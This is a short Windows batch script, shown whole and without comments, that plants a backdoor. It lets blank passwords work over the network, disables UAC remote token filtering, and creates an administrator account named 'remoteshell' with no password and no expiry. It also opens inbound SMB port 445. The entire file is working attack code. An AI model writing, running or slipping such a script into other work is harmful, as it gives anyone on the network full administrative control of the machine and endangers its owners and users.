@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
net users remoteshell /add
net localgroup Administrators /add remoteshell
WMIC USERACCOUNT WHERE Name='remoteshell' SET PasswordExpires=FALSE
netsh advfirewall firewall add rule name="TCP Port 445" dir=in action=allow protocol=TCP localport=445
